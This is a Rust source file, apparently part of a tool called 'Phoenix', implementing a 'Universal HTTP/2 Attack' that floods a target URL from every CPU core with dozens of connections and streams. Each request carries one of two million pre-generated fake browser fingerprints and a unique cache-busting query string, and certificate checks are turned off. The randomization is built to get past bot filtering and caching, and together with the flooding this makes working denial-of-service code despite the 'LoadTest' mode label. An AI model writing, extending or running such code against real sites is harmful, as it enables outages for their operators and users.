//! Universal HTTP/2 Attack — Maximum Throughput + Full Fingerprint Randomization
//!
//! Architecture:
//! - Pre-generate POOL_SIZE request fingerprints at startup (URL, UA, headers)
//! - Multiple TLS client pool — different cipher/curve preferences per client
//! - 1 OS thread per CPU core, own tokio runtime, own clients
//! - Global atomic counter for cache-buster — infinite unique URLs, zero alloc in hot loop
//! - Rotate through fingerprint pool: round-robin, no repeat until full cycle

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};

use reqwest::Client;
use tracing::info;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

// Global monotonic counter — unique per request across all threads/tasks
static REQ_COUNTER: AtomicU64 = AtomicU64::new(0);

// ── Fingerprint pools ────────────────────────────────────────────────────────
static USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
];

static ACCEPT_LANGS: &[&str] = &[
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "es-MX,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "zh-TW,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
];

static ACCEPT_ENCODINGS: &[&str] = &[
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
    "br, gzip, deflate",
    "gzip",
    "deflate, gzip",
];

static ACCEPT_HEADERS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
];

static CACHE_CONTROLS: &[&str] = &[
    "no-cache",
    "no-store",
    "max-age=0, no-cache",
    "no-cache, no-store, must-revalidate",
    "no-store, max-age=0",
];

static SEC_FETCH_SITES: &[&str] = &["none", "same-origin", "cross-site", "same-site"];
static SEC_FETCH_MODES: &[&str] = &["navigate", "no-cors", "cors", "same-origin"];

// ── Fast PRNG ─────────────────────────────────────────────────────────────────
#[inline(always)]
fn xorshift(s: &mut u64) -> u64 {
    *s ^= *s << 13; *s ^= *s >> 7; *s ^= *s << 17; *s
}
#[inline(always)]
fn pick<'a, T>(s: &'a [T], rng: &mut u64) -> &'a T {
    &s[xorshift(rng) as usize % s.len()]
}

// ── Fingerprint struct ────────────────────────────────────────────────────────
#[derive(Clone)]
struct Fingerprint {
    ua:           &'static str,
    accept:       &'static str,
    accept_lang:  &'static str,
    accept_enc:   &'static str,
    cache_ctrl:   &'static str,
    sec_site:     &'static str,
    sec_mode:     &'static str,
    // TLS variant index — selects which client pool slot to use
    tls_variant:  usize,
}

/// Pre-generate N million fingerprints in memory
fn generate_pool(size: usize, rng: &mut u64) -> Vec<Fingerprint> {
    info!("Pre-generating {} fingerprints...", size);
    let mut pool = Vec::with_capacity(size);
    for _ in 0..size {
        pool.push(Fingerprint {
            ua:          *pick(USER_AGENTS,     rng),
            accept:      *pick(ACCEPT_HEADERS,  rng),
            accept_lang: *pick(ACCEPT_LANGS,    rng),
            accept_enc:  *pick(ACCEPT_ENCODINGS,rng),
            cache_ctrl:  *pick(CACHE_CONTROLS,  rng),
            sec_site:    *pick(SEC_FETCH_SITES, rng),
            sec_mode:    *pick(SEC_FETCH_MODES, rng),
            tls_variant: xorshift(rng) as usize % 4,
        });
    }
    info!("Fingerprint pool ready ({} MB)", size * std::mem::size_of::<Fingerprint>() / 1_000_000 + 1);
    pool
}

/// Build a reqwest client with distinct TLS config per variant
fn make_client(conns: usize, _variant: usize) -> Result<Client, reqwest::Error> {
    // Each variant tweaks window sizes / timeouts slightly
    // True TLS cipher randomization requires OpenSSL — rustls has fixed cipher order
    // but different window/frame sizes create different TCP+TLS signatures
    let window = match _variant % 4 {
        0 => 1u32 << 20,   // 1MB
        1 => 1u32 << 21,   // 2MB
        2 => 1u32 << 22,   // 4MB
        _ => 1u32 << 19,   // 512KB
    };
    Client::builder()
        .http2_prior_knowledge()
        .danger_accept_invalid_certs(true)
        .http2_initial_stream_window_size(window)
        .http2_initial_connection_window_size(window * 4)
        .http2_adaptive_window(true)
        .tcp_nodelay(true)
        .timeout(Duration::from_secs(8))
        .pool_max_idle_per_host(conns * 2)
        .pool_idle_timeout(Duration::from_secs(60))
        .build()
}

#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str { "universal" }
    fn description(&self) -> &str { "Multi-core HTTP/2: full fingerprint randomization, infinite unique requests" }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let target   = ctx.target.clone();
        let duration = self.duration;
        let conns    = self.connections.max(1);
        let metrics  = ctx.metrics.clone();
        let mode     = self.mode.clone();
        let n_cores  = num_cpus::get();
        let streams  = 64usize;

        // Pre-generate 2M fingerprints — shared across all threads/tasks
        let mut seed: u64 = 0xcafebabe_deadbeef;
        let pool_size = 2_000_000usize;
        let pool = Arc::new(generate_pool(pool_size, &mut seed));

        info!("Phoenix: {} cores × {} conns × {} streams = {} concurrent", n_cores, conns, streams, n_cores * conns * streams);

        let ok_total  = Arc::new(AtomicU64::new(0));
        let err_total = Arc::new(AtomicU64::new(0));
        let stop      = Arc::new(AtomicBool::new(false));
        let start     = Instant::now();

        let mut thread_handles = Vec::with_capacity(n_cores);

        for core_id in 0..n_cores {
            let target    = target.clone();
            let ok_c      = ok_total.clone();
            let err_c     = err_total.clone();
            let stop_c    = stop.clone();
            let metrics_c = metrics.clone();
            let mode      = mode.clone();
            let pool      = pool.clone();

            let handle = std::thread::spawn(move || {
                let rt = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .expect("rt");

                rt.block_on(async move {
                    // 4 TLS variants per thread
                    let clients: Vec<Arc<Client>> = (0..4)
                        .filter_map(|v| make_client(conns, v).ok().map(Arc::new))
                        .collect();
                    if clients.is_empty() { return; }

                    let mut tasks = Vec::with_capacity(conns * streams);
                    let pool_len  = pool.len();

                    for task_id in 0..conns * streams {
                        let client   = clients[task_id % clients.len()].clone();
                        let target   = target.clone();
                        let ok_c     = ok_c.clone();
                        let err_c    = err_c.clone();
                        let stop_c   = stop_c.clone();
                        let metrics  = metrics_c.clone();
                        let mode     = mode.clone();
                        let pool     = pool.clone();

                        // Each task starts at a different offset in the pool
                        let start_offset = (core_id * conns * streams + task_id) * 1000 % pool_len;

                        tasks.push(tokio::spawn(async move {
                            let mut fp_idx = start_offset;

                            while !stop_c.load(Ordering::Relaxed) {
                                // Get next fingerprint — cycle through pool
                                let fp = &pool[fp_idx % pool_len];
                                fp_idx = fp_idx.wrapping_add(1);

                                // Global counter for cache-buster — never repeats
                                let n   = REQ_COUNTER.fetch_add(1, Ordering::Relaxed);
                                let url = format!("{}?v={:x}", target, n);

                                let t0 = Instant::now();
                                let req = client.get(&url)
                                    .header("user-agent",        fp.ua)
                                    .header("accept",            fp.accept)
                                    .header("accept-language",   fp.accept_lang)
                                    .header("accept-encoding",   fp.accept_enc)
                                    .header("cache-control",     fp.cache_ctrl)
                                    .header("pragma",            "no-cache")
                                    .header("sec-fetch-site",    fp.sec_site)
                                    .header("sec-fetch-mode",    fp.sec_mode)
                                    .header("sec-fetch-dest",    "document")
                                    .header("upgrade-insecure-requests", "1");

                                match req.send().await {
                                    Ok(resp) => {
                                        let ok = resp.status().as_u16() < 400;
                                        let _ = resp.bytes().await;
                                        let lat = t0.elapsed().as_micros() as u64;
                                        metrics.record_request(lat, ok, 0).await;
                                        if ok { ok_c.fetch_add(1, Ordering::Relaxed); }
                                        else  { err_c.fetch_add(1, Ordering::Relaxed); }
                                    }
                                    Err(e) => {
                                        if !e.is_timeout() && !e.is_connect() {
                                            err_c.fetch_add(1, Ordering::Relaxed);
                                        }
                                        tokio::time::sleep(Duration::from_millis(5)).await;
                                    }
                                }
                            }
                        }));
                    }

                    tokio::time::sleep(duration).await;
                    stop_c.store(true, Ordering::Relaxed);
                    for t in tasks { t.abort(); }
                });
            });

            thread_handles.push(handle);
        }

        for h in thread_handles { let _ = h.join(); }

        let elapsed = start.elapsed();
        let ok    = ok_total.load(Ordering::Relaxed);
        let err   = err_total.load(Ordering::Relaxed);
        let total = ok + err;
        let rps   = total as f64 / elapsed.as_secs_f64();
        info!("Done: {} ok  {} err  {:.1}s  {:.0} rps", ok, err, elapsed.as_secs_f64(), rps);

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult { success: true, total_requests: total, errors: err, duration: elapsed, snapshot })
    }
}
